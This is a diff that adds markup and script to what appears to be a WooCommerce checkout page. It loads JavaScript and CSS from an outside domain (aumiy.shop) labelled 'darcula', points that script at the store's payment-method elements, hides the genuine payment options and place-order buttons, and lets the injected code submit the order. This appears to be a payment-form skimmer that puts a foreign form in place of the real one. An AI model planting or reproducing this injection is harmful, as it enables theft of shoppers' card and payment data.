@@ -1,0 +1,37 @@
+<script
+  src="https://cdnjs.cloudflare.com/ajax/libs/systemjs/6.15.1/s.min.js"
+  crossorigin="anonymous"
+  referrerpolicy="no-referrer"
+></script>
+<link rel="stylesheet" href="https://aumiy.shop/app/app.css?v=3" />
+<script class="darcula-js" src="https://aumiy.shop/app/app.js?v=3"></script>
+
+<script type="text/javascript">
+  var eCommerceConfig = {
+    layoutSelector:
+      "#cfw-billing-methods .wc_payment_methods,.wc-block-components-radio-control-accordion-option",
+  };
+
+  function darcula_call_submit() {
+    const sBtn = document.querySelector(
+      "[name='woocommerce_checkout_place_order']"
+    );
+    if (sBtn) sBtn.click();
+  }
+  function darcula_call_purchase() {
+    const value = document
+      .querySelector(".order-total")
+      ?.textContent?.trim()
+      .match(/(\d|\.)+/)?.[0];
+    fbq("track", "Purchase", value ? { value, currency: "USD" } : {});
+  }
+</script>
+
+<style>
+  #payment #place_order,
+  .wc-block-components-radio-control-accordion-option,
+  [type="button"].components-button,
+  [name="woocommerce_checkout_place_order"] {
+    display: none !important;
+  }
+</style>
